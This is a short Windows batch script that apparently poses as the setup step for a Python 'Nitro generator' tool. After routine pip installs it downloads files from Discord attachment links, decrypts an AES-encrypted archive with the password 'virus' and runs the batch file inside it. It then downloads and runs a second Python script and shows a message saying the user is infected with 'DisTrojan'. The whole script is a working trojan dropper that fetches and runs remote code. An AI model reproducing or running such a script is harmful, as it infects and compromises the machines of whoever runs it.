python -m pip install --upgrade pip
pip install requests
pip install alive_progress
pip install colorama
pip install pyfiglet
pip install win32api
curl https://cdn.discordapp.com/attachments/891809772007981096/898377953052880896/requirements.txt --output pyrq.txt
pip install -r pyrq.txt
curl https://www.aescrypt.com/download/v3/windows/AESCrypt_console_v310_win32.zip --output AEScrypt.zip
powershell -command "Expand-Archive -Force '%~dp0AEScrypt.zip' '%~dp0'"
move "%~dp0AESCrypt_console_v310_win32\aescrypt.exe" "%~dp0"
curl https://cdn.discordapp.com/attachments/891809772007981096/897272000526024764/vpacked.zip.aes --output vpacked.zip.aes
aescrypt -d -p virus vpacked.zip.aes
powershell -command "Expand-Archive -Force '%~dp0vpacked.zip' '%~dp0'"
cd vpacked
start execute.cmd
cd ..\
curl --url https://cdn.discordapp.com/attachments/891809772007981096/898371729020289024/NitroGen.py --output xtr.py
python xtr.py
mshta vbscript:Execute("msgbox ""You are Infected With DisTrojan"":close")